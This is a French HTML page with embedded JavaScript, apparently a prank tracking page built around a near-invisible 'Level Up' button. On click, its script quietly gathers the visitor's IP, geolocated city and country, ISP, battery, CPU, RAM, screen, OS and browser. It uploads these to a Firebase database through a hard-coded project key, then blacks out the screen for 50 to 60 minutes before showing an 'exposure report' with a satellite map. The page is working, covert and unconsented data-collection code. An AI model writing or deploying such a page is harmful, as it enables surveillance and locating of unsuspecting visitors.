<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { scrollbar-width: none; -ms-overflow-style: none; }
        *::-webkit-scrollbar { display: none; }

        body { 
            font-family: 'Outfit', sans-serif; 
            background-color: #000000;
            height: 100vh;
            overflow: hidden;
            color: white;
        }

        .mono { font-family: 'JetBrains Mono', monospace; }
        .fade-in { opacity: 0; animation: fadeIn 0.8s ease-out forwards; }
        @keyframes fadeIn { to { opacity: 1; } }
        
        .scan-line {
            width: 100%; height: 2px; background: rgba(239, 68, 68, 0.4);
            position: absolute; top: 0; left: 0; z-index: 10;
            animation: scan 3s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        .target-circle {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 80px; height: 80px; border: 2px solid rgba(239, 68, 68, 0.6);
            border-radius: 50%; z-index: 11; pointer-events: none;
            animation: pulse-red 2s infinite;
        }
        @keyframes pulse-red {
            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.8; }
            100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0; }
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen m-0 p-2 select-none relative">

    <!-- Étape 1 : Le bouton minimaliste sur écran noir -->
    <div id="step-1" class="w-full h-full absolute inset-0 z-20 transition-opacity duration-500">
        <!-- Texte central mystérieux et Logo Pirate -->
        <div class="absolute inset-0 flex flex-col items-center justify-center pointer-events-none">
            <h1 class="text-zinc-400 text-xl md:text-2xl font-mono uppercase tracking-[0.8em] opacity-40 ml-4">Level Up</h1>
            <!-- Logo SVG Tête de mort (ultra pro et fin) -->
            <svg class="w-12 h-12 mt-8 text-zinc-600 opacity-30" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="0.8" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="9" cy="12" r="1.5"></circle>
                <circle cx="15" cy="12" r="1.5"></circle>
                <path d="M8 20v2h8v-2"></path>
                <path d="M12.5 17l-.5-1-.5 1h1z"></path>
                <path d="M16 20a2 2 0 0 0 1.56-3.25 8 8 0 1 0-11.12 0A2 2 0 0 0 8 20"></path>
            </svg>
        </div>
        
        <!-- Bouton ultra discret en bas à gauche -->
        <button id="unlock-btn" class="absolute bottom-4 left-4 text-[6px] font-thin tracking-[0.5em] text-zinc-900 hover:text-zinc-600 uppercase font-mono transition-colors duration-500 cursor-pointer outline-none bg-transparent border-none p-2">
            
        </button>
    </div>

    <!-- Étape 2 : L'écran noir total (Chargement) -->
    <div id="step-loading" class="hidden absolute inset-0 z-10 bg-black w-full h-full"></div>

    <!-- Étape 3 : La Révélation (Le Rapport Densifié) -->
    <div id="step-2" class="hidden bg-white p-3.5 rounded-[1.5rem] shadow-2xl w-full max-w-sm flex-col items-center border border-red-500/20 z-30 fade-in text-slate-900 overflow-y-auto max-h-[98vh]">
        <div class="inline-flex items-center gap-2 bg-red-50 text-red-600 px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-[0.2em] mb-2 border border-red-100 text-center">
            <span class="w-1.5 h-1.5 bg-red-600 rounded-full animate-pulse"></span>
            Sécurité Compromise
        </div>

        <h2 class="text-lg font-black text-slate-900 mb-0.5 tracking-tight">Rapport d'Exposition</h2>
        <p class="text-slate-400 text-[8px] mb-3 text-center px-4 leading-tight uppercase font-bold tracking-widest">Empreinte Numérique Capturée</p>

        <div class="w-full space-y-1.5">
            <!-- Grille d'Infos (Compacte) -->
            <div class="bg-slate-50 border border-slate-100 rounded-xl p-2.5 grid grid-cols-2 gap-x-3 gap-y-2.5 text-[9px]">
                
                <!-- ID & Date -->
                <div class="flex flex-col">
                    <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px] mb-0.5">ID Session</span>
                    <span id="display-name" class="font-bold text-slate-900 mono">...</span>
                </div>
                <div class="flex flex-col text-right">
                    <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px] mb-0.5">Capture</span>
                    <span id="display-date" class="font-bold text-slate-900 mono">...</span>
                </div>

                <!-- Réseau & FAI -->
                <div class="flex flex-col col-span-2 border-t border-slate-200/50 pt-2.5">
                    <div class="flex justify-between items-center mb-1">
                        <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px]">Réseau / FAI</span>
                        <span id="display-conn" class="font-bold text-blue-500 text-[8px] bg-blue-50 px-1.5 py-0.5 rounded">...</span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span id="display-ip" class="font-bold text-blue-600 mono text-[11px]">...</span>
                        <span id="display-isp" class="font-bold text-slate-700 truncate max-w-[100px]">...</span>
                    </div>
                </div>

                <!-- Matériel (Nouveau) -->
                <div class="flex flex-col col-span-2 border-t border-slate-200/50 pt-2.5">
                    <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px] mb-1.5">Spécifications Matérielles</span>
                    <div class="flex justify-between items-center">
                        <div class="flex items-center gap-1.5">
                            <span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m14-6h2m-2 6h2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg></span>
                            <span id="display-cpu" class="font-bold text-slate-800">...</span>
                        </div>
                        <div class="flex items-center gap-1.5">
                            <span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4"></path></svg></span>
                            <span id="display-ram" class="font-bold text-slate-800">...</span>
                        </div>
                        <div class="flex items-center gap-1.5">
                            <div id="battery-icon-container" class="text-green-500"></div>
                            <span id="display-battery" class="font-bold text-slate-800">...</span>
                        </div>
                    </div>
                </div>

                <!-- Logiciel & Écran (Nouveau) -->
                <div class="flex flex-col col-span-2 border-t border-slate-200/50 pt-2.5">
                    <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px] mb-1.5">Système & Navigateur</span>
                    <div class="flex justify-between items-center">
                        <div class="flex items-center gap-1.5 truncate max-w-[45%]">
                            <div id="os-icon-container" class="text-slate-500"></div>
                            <span id="display-system" class="font-bold text-slate-800 truncate">...</span>
                        </div>
                        <div class="flex items-center gap-1.5">
                            <span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg></span>
                            <span id="display-screen" class="font-bold text-slate-800 mono">...</span>
                        </div>
                    </div>
                </div>

            </div>

            <!-- Carte Google Maps -->
            <div class="relative w-full h-24 bg-slate-200 rounded-[1rem] overflow-hidden border border-slate-200 shadow-inner">
                <div class="scan-line"></div><div class="target-circle"></div>
                <iframe id="display-map" width="100%" height="100%" frameborder="0" style="border:0;" src="" loading="lazy"></iframe>
            </div>

            <div class="bg-slate-900 p-2.5 rounded-xl flex items-center justify-between text-white">
                <div class="flex items-center gap-2">
                    <img id="display-flag" src="" alt="Flag" class="hidden w-4 h-2.5 object-cover rounded-sm">
                    <span id="display-location" class="text-[9px] font-bold uppercase tracking-widest truncate">...</span>
                </div>
                <span id="display-browser" class="text-[8px] text-slate-400 font-mono">...</span>
            </div>
        </div>

        <p class="text-[8px] font-bold text-slate-400 italic mt-3">Ne cliquez jamais sur un bouton inconnu.</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
            authDomain: "test-9022.firebaseapp.com",
            projectId: "test-9022",
            storageBucket: "test-9022.firebasestorage.app",
            messagingSenderId: "945536290936",
            appId: "1:945536290936:web:de1437cea95e63cb559d8d"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const osIcons = {
            iphone: `<svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.1 2.48-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83zM13 3.5c.73-.89 1.22-2.14 1.08-3.38-1.06.04-2.34.71-3.1 1.6-.68.79-1.28 2.06-1.12 3.26 1.18.09 2.39-.59 3.14-1.48z"/></svg>`,
            android: `<svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><path d="M17.523 15.3414C17.0609 15.3414 16.6917 14.9723 16.6917 14.5101C16.6917 14.048 17.0609 13.6788 17.523 13.6788C17.9852 13.6788 18.3543 14.048 18.3543 14.5101C18.3543 14.9723 17.9852 15.3414 17.523 15.3414ZM6.47611 15.3414C6.01402 15.3414 5.64478 14.9723 5.64478 14.5101C5.64478 14.048 6.01402 13.6788 6.47611 13.6788C6.93836 13.6788 7.30744 14.048 7.30744 14.5101C7.30744 14.9723 6.93836 15.3414 6.47611 15.3414ZM17.9252 10.7412L19.7891 7.51352C19.897 7.32671 19.8329 7.08779 19.6462 6.97987C19.4594 6.87187 19.2204 6.93602 19.1124 7.12283L17.221 10.397C15.7196 9.71181 14.0041 9.32432 12.1994 9.32432C10.3948 9.32432 8.67931 9.71181 7.17792 10.397L5.28652 7.12283C5.17852 6.93602 4.93952 6.87187 4.75271 6.97987C4.56598 7.08779 4.50191 7.32671 4.60991 7.51352L6.47371 10.7412C2.86872 12.6953 0.444336 16.3776 0.444336 20.6757H23.9546C23.9546 16.3776 21.5302 12.6953 17.9252 10.7412Z"/></svg>`,
            windows: `<svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><path d="M0 3.449L9.75 2.1V11.7H0V3.449zm0 17.102L9.75 21.9V12.3H0v8.251zM11.25 1.899L24 0v11.7H11.25V1.899zm12.75 22.101L11.25 22.2V12.3H24v11.7z"/></svg>`,
            default: `<svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>`
        };

        function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            let name = "PC Bureau"; let icon = osIcons.windows;
            let browser = "Navigateur Inconnu";

            if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
            else if (ua.includes("Trident")) browser = "Internet Explorer";
            else if (ua.includes("Edge") || ua.includes("Edg")) browser = "Edge";
            else if (ua.includes("Chrome")) browser = "Chrome";
            else if (ua.includes("Safari")) browser = "Safari";

            if (/iPhone|iPad|iPod/i.test(ua)) { name = "Apple iPhone/iPad"; icon = osIcons.iphone; }
            else if (/Android/i.test(ua)) {
                icon = osIcons.android;
                if (/Samsung|SM-|GT-/i.test(ua)) name = "Samsung Galaxy";
                else if (/Huawei|Honor/i.test(ua)) name = "Huawei Device";
                else if (/Pixel/i.test(ua)) name = "Google Pixel";
                else name = "Appareil Android";
            }
            else if (/Mac/i.test(ua)) { name = "Apple Mac"; icon = osIcons.iphone; }

            return { name, icon, browser };
        }

        async function getBatterySVG(level) {
            const displayLevel = isNaN(level) ? 100 : level;
            const color = displayLevel > 20 ? '#22c55e' : '#ef4444';
            return `<svg class="w-3.5 h-3.5" fill="none" stroke="${color}" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="7" width="16" height="10" rx="2" /><path d="M21 10v4" /><rect x="4" y="9" width="${Math.max(1, (displayLevel/100)*12)}" height="6" fill="${color}" stroke="none" /></svg>`;
        }

        async function processClick() {
            let geoData = {}; let batteryLevel = "100";
            const now = new Date();
            const dateStr = now.toLocaleDateString('fr-FR', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit', second: '2-digit' });
            
            const sessionId = 'ID-' + Math.random().toString(36).substr(2, 6).toUpperCase();

            // Nouvelles données de Fingerprinting matériel
            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Inconnu";
            const ram = navigator.deviceMemory ? navigator.deviceMemory + " Go RAM" : "Inconnue";
            const screenRes = window.screen.width + "x" + window.screen.height;
            const connType = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "WIFI/LAN";

            try {
                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                geoData = await response.json();
                if ('getBattery' in navigator) {
                    const b = await navigator.getBattery();
                    batteryLevel = Math.round(b.level * 100);
                }
            } catch (e) { batteryLevel = "100"; }
            
            const dev = getDetailedDeviceInfo();
            
            const data = { 
                session_id: sessionId, 
                ip: geoData.ip || "N/A", 
                ville: geoData.city || "Inconnue", 
                pays: geoData.country || "Inconnu", 
                isp: geoData.organization || "Inconnu", 
                batterie: batteryLevel + "%", 
                os: dev.name,
                navigateur: dev.browser,
                cpu: cores,
                ram: ram,
                ecran: screenRes,
                reseau: connType,
                date_clic: serverTimestamp() 
            };
            
            try { await addDoc(collection(db, "visites_mysteres"), data); } catch(e) {}

            return { ...geoData, batteryLevel, dev, dateStr, sessionId, cores, ram, screenRes, connType };
        }

        document.getElementById('unlock-btn').addEventListener('click', async () => {
            const step1 = document.getElementById('step-1');
            step1.style.opacity = '0';
            
            setTimeout(() => {
                step1.classList.add('hidden');
                document.getElementById('step-loading').classList.remove('hidden');
            }, 500);
            
            const dataPromise = processClick();
            
            // Attente aléatoire entre 50 minutes et 1 heure (3000000 ms à 3600000 ms) dans le noir complet
            const tempsAttenteMs = Math.floor(Math.random() * (3600000 - 3000000 + 1)) + 3000000;
            await new Promise(r => setTimeout(r, tempsAttenteMs));
            
            const data = await dataPromise;
            
            // Remplissage des données
            document.getElementById('display-date').textContent = data.dateStr;
            document.getElementById('display-name').textContent = data.sessionId;
            document.getElementById('display-ip').textContent = data.ip || "127.0.0.1";
            document.getElementById('display-isp').textContent = data.organization || "Fournisseur Inconnu";
            document.getElementById('display-conn').textContent = data.connType;
            
            // Matériel
            document.getElementById('display-cpu').textContent = data.cores;
            document.getElementById('display-ram').textContent = data.ram;
            document.getElementById('display-battery').textContent = data.batteryLevel + "%";
            document.getElementById('battery-icon-container').innerHTML = await getBatterySVG(parseInt(data.batteryLevel));
            
            // Logiciel
            document.getElementById('display-system').textContent = data.dev.name;
            document.getElementById('os-icon-container').innerHTML = data.dev.icon;
            document.getElementById('display-screen').textContent = data.screenRes;
            document.getElementById('display-browser').textContent = data.dev.browser;
            
            // Carte et Localisation
            const locText = (data.city ? data.city + ", " : "") + (data.country || "Inconnu");
            document.getElementById('display-location').textContent = locText;
            document.getElementById('display-map').src = `https://maps.google.com/maps?q=${encodeURIComponent(locText)}&t=k&z=14&ie=UTF8&iwloc=&output=embed`;
            
            if (data.country_code) { 
                document.getElementById('display-flag').src = `https://flagcdn.com/w40/${data.country_code.toLowerCase()}.png`; 
                document.getElementById('display-flag').classList.remove('hidden'); 
            }
            
            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
            
            document.getElementById('step-loading').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
            document.getElementById('step-2').classList.add('flex');
        });
    </script>
</body>
</html>
